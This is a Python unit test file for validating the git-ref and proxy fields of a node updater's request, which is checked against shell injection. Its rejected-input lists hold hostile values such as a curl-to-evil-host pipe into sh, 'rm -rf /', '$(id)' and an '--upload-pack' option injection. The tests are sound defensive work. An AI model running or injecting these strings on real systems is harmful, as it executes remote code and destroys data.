"""Tests for the update-request validation in app.routers.system.

Runnable with plain stdlib:  python -m unittest discover -s node/tests

Оба поля подставляются в текст shell-скрипта, который апдейтер исполняет на
хосте через nsenter, поэтому у теста две обязанности сразу: не пропустить
метасимвол и не отсечь то, чем реально пользуются. Второе не менее важно —
слишком узкий паттерн отрезал бы ноду от обновлений, включая откат по SHA.
"""

import os
import sys
import unittest

from pydantic import ValidationError

sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))

from app.routers.system import UpdateRequest  # noqa: E402


ACCEPTED_REFS = [
    "main",                                      # стабильный канал
    "dev",                                       # dev-канал
    "10.14.0",                                   # тег версии — путь отката
    "v10.14.0",
    "1a2b3c4",                                   # короткий SHA
    "0123456789abcdef0123456789abcdef01234567",  # полный SHA
    "release/10.14",                             # ветка со слешем
    "fix_node-update.v2",
]

REJECTED_REFS = [
    "main; curl http://evil/x | sh",
    "main && reboot",
    "$(id)",
    "`id`",
    "main\nrm -rf /",
    "main | tee /etc/passwd",
    "main 'quoted'",
    'main "quoted"',
    "--upload-pack=/bin/sh",   # ведущий дефис git принял бы за опцию
    "main*",                   # глоб раскрылся бы в неквотированной подстановке
    "main$HOME",
    "",
    "x" * 101,                 # длиннее max_length
]

ACCEPTED_PROXIES = [
    "http://127.0.0.1:3128",
    "https://proxy.example.com:8080",
    "socks5://10.0.0.1:1080",
    "socks5h://10.0.0.1:1080",
    "http://user:pass@proxy.example.com:3128",
    "http://127.0.0.1:3128/",
]

REJECTED_PROXIES = [
    "http://127.0.0.1:3128; reboot",
    "http://127.0.0.1:3128 && id",
    "http://$(id)",
    "http://127.0.0.1:3128\nrm -rf /",
    "http://proxy with space:3128",
    "127.0.0.1:3128",          # без схемы — не URL
    "http://",                 # схема без хоста
    "",
]


class GitRefValidationTests(unittest.TestCase):

    def test_accepts_everything_the_panel_and_rollback_actually_send(self):
        for ref in ACCEPTED_REFS:
            with self.subTest(ref=ref):
                self.assertEqual(UpdateRequest(target_version=ref).target_version, ref)

    def test_rejects_shell_metacharacters_and_option_lookalikes(self):
        for ref in REJECTED_REFS:
            with self.subTest(ref=ref):
                with self.assertRaises(ValidationError):
                    UpdateRequest(target_version=ref)

    def test_omitted_ref_stays_none(self):
        self.assertIsNone(UpdateRequest().target_version)
        self.assertIsNone(UpdateRequest(target_version=None).target_version)


class ProxyValidationTests(unittest.TestCase):

    def test_accepts_usual_proxy_urls(self):
        for proxy in ACCEPTED_PROXIES:
            with self.subTest(proxy=proxy):
                self.assertEqual(UpdateRequest(proxy=proxy).proxy, proxy)

    def test_rejects_shell_metacharacters(self):
        for proxy in REJECTED_PROXIES:
            with self.subTest(proxy=proxy):
                with self.assertRaises(ValidationError):
                    UpdateRequest(proxy=proxy)

    def test_omitted_proxy_stays_none(self):
        self.assertIsNone(UpdateRequest().proxy)


if __name__ == "__main__":
    unittest.main()
